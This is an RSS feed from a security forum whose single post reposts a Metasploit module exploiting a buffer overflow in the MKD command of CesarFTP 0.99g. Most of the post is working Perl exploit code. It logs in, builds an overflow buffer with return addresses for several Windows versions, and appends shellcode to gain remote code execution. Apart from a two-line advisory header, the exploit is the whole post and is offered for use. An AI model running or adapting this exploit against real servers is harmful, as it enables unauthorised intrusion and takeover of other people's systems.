<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "CesarFTP Buffer Overflow (Metasploit)"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/13.html</link>
		<description><![CDATA[Latest messages posted in the topic "CesarFTP Buffer Overflow (Metasploit)"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>CesarFTP Buffer Overflow (Metasploit)</title>
				<description><![CDATA[ <span class="link"> http://www.aclogic.com/</span> CesarFTP is an easy-to-use and fast to configure FTP server.

A buffer overflow in CesarFTP allows a remote attacker to execute arbitrary code on the vulnerable system.

Vulnerable Systems: CesarFTP version 0.99g

Exploit:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>##
#---ORIGINAL CREDITS TO h07 FOR FINDING THIS VULN---
# Ported to metasploit by c0rrupt
# ~ f34r.us ~
##

package Msf::Exploit::cesarftp_mkd;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
        'Name'     =&gt; 'CesarFTP 0.99g  Buffer Overflow',
        'Version'  =&gt; '$Revision: 1.3 $',
        'Authors'  =&gt; &#91; 'c0rrupt &#91;at&#93; f34r &#91;dot&#93; us', &#93;,

        'Arch'  =&gt; &#91; 'x86' &#93;,
        'OS'    =&gt; &#91; 'win32', 'win2000', 'winxp' &#93;,
        'Priv'  =&gt; 0,

        'AutoOpts'  =&gt; { 'EXITFUNC' =&gt; 'seh' },
        'UserOpts'  =&gt;
          {
                'RHOST' =&gt;  &#91;1, 'ADDR', 'The target address'&#93;,
                'RPORT' =&gt;  &#91;1, 'PORT', 'The target port', 21&#93;,
                'USER'  =&gt;  &#91;1, 'USER', 'Login name'&#93;,
                'PASS'  =&gt;  &#91;1, 'PASS', 'Password'&#93;,
          },

        'Payload'  =&gt;
          {
                'Space' =&gt; 325,
                'BadChars'  =&gt; 
"\x00\x09\x0a\x0d\x22\x25\x26\x27\x2f\x3a\x3e\x3f\xFF\x5c",
          },

        'Description'  =&gt;  Pex::Text::Freeform&#40;qq{
        This module exploits the buffer overflow found in the MKD command
        in CesarFTP 0.99g. It is required that the user be properly logged 
in
        before the exploit can be peformed.
}&#41;,

        'Refs'  =&gt;
          &#91;
                &#91;'URL',   'http://www.milw0rm.com/exploits/1906'&#93;
          &#93;,

        'DefaultTarget' =&gt; 0,
        'Targets' =&gt;
          &#91;
                        &#91;'Windows XP SP2 English',       0x7746F114 &#93;,  # 
comctl32
                        &#91;'Windows XP SP0/SP1 English',   0x776606af &#93;,
                        &#91;'Windows 2003 server sp0/xp sp1 English',  
0x77798428 &#93;,
                        &#91;'Windows 2003 server SP1 English',  0x7caa9618 &#93;,
                        &#91;'Windows 2000 SP4 English',  0x78344dd3 &#93;,
          &#93;,

        'Keys'  =&gt; &#91;'ceasarftp'&#93;,

        'DisclosureDate' =&gt; 'June 12 2006',
  };

sub new {
        my $class = shift;
        my $self = $class-&gt;SUPER::new&#40;{'Info' =&gt; $info, 'Advanced' =&gt; 
$advanced}, @_&#41;;
        return&#40;$self&#41;;
}

sub Exploit {
        my $self = shift;
        my $target_host = $self-&gt;GetVar&#40;'RHOST'&#41;;
        my $target_port = $self-&gt;GetVar&#40;'RPORT'&#41;;
        my $target_idx  = $self-&gt;GetVar&#40;'TARGET'&#41;;
        my $shellcode   = $self-&gt;GetVar&#40;'EncodedPayload'&#41;-&gt;Payload;
        my $target      = $self-&gt;Targets-&gt;&#91;$target_idx&#93;;
        my $user                = $self-&gt;GetVar&#40;'USER'&#41;;
        my $pass                = $self-&gt;GetVar&#40;'PASS'&#41;;

        my $buf = "MKD " . "\n"x671 . "A"x3 . pack&#40;'V', $target-&gt;&#91;1&#93;&#41; .  
$shellcode . "\x0d\x0a";

#pack&#40;'V', $target-&gt;&#91;1&#93;&#41;

#"\x23\x79\xAB\x71"

$self-&gt;PrintLine&#40;sprintf&#40;"&#91;*&#93; Trying to exploit target %s ", $target-&gt;&#91;0&#93;, 
&#41;&#41;;

        my $sock = Msf::Socket::Tcp-&gt;new
          &#40;
                'PeerAddr'  =&gt; $target_host,
                'PeerPort'  =&gt; $target_port,

          &#41;;

        if &#40;$sock-&gt;IsError&#41; {
                $self-&gt;PrintLine&#40;'&#91;*&#93; Error creating socket: ' . 
$sock-&gt;GetError&#41;;
                return;
        }
        
my $r = $sock-&gt;Recv&#40;-1, 20&#41;;
        if &#40;! $r&#41; { $self-&gt;PrintLine&#40;"&#91;*&#93; No response from FTP server"&#41;; 
return; }

$self-&gt;PrintLine&#40;sprintf&#40;"&#91;*&#93; Sending login credentials"&#41;&#41;;
$sock-&gt;Send&#40;"USER $user" . "\x0d\x0a"&#41;;
sleep&#40;1&#41;;

$sock-&gt;Send&#40;"PASS $pass" . "\x0d\x0a"&#41;;
sleep&#40;1&#41;;
$self-&gt;PrintLine&#40;sprintf&#40;"&#91;*&#93; Sending evil request"&#41;&#41;;

$sock-&gt;Send&#40;$buf&#41;;
$self-&gt;PrintLine&#40;sprintf&#40;"&#91;*&#93; Exploit complete"&#41;&#41;;

        
        return;
}</pre>
		</div>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/166.html#564</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/166.html#564</link>
				<pubDate><![CDATA[Tue, 20 Jun 2006 21:19:07]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
	</channel>
</rss>
